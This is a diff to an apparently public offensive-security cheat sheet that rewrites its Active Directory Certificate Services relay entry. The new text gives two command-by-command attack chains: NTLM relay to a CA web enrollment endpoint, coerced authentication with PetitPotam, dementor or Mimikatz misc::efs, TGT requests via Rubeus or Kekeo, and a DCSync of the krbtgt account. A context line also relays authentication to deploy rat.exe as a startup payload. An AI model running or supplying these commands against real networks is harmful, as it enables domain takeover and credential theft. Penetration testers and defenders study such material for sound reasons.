@@ -1737,27 +1737,46 @@ Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impack
 ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
 ```
 
-
 #### AD CS Relay Attack
 
-https://github.com/SecureAuthCorp/impacket/pull/1101
+Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101)
 
-1. Run the ntlmrelayx.py and set your Certificate Authority (CA) as a target
+* Version 1: NTLM Relay + Rubeus + PetitPotam
     ```powershell
-    python3 ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs
-    python3 ntlmrelayx.py -t http://cs1.lab.local/certsrv/certfnsh.asp -smb2support --adcs
-    ```
-2. Exploit the print spooler bug
-    ```powershell
+    impacket> python3 ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs
+    impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template workstation
+    # template workstation, DomainController, Machine
+
+    # Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam 
+    # You can also use any other way to coerce the authentication like printspooler
+    git clone https://github.com/topotam/PetitPotam
+    python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
+    python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
     python3 dementor.py <listener> <target> -u <username> -p <password> -d <domain>
     python3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local
-    ```
-3. Request the TGT using the certificate
-    ```powershell
+
+    # Use the certificate with rubeus to request a TGT
     Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
-    Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzCC...<snip>...NfrHtUUXS /ptt
+    Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt
+
+    # Now you can use the TGT to perform a DCSync
+    mimikatz> lsadump::dcsync /user:krbtgt
     ```
-4. Now you can DCSync with the DC machine account
+
+* Version 2: NTLM Relay + Mimikatz + Kekeo
+    ```powershell
+    impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+
+    # Mimikatz
+    mimikatz> misc::efs /server:dc.lab.local /connect:<IP> /noauth
+
+    # Kekeo
+    kekeo> base64 /input:on
+    kekeo> tgt::ask /pfx:<BASE64-CERT-FROM-NTLMRELAY> /user:dc$ /domain:lab.local /ptt
+
+    # Mimikatz
+    mimikatz> lsadump::dcsync /user:krbtgt
+    ```
 
 
 ### Dangerous Built-in Groups Usage
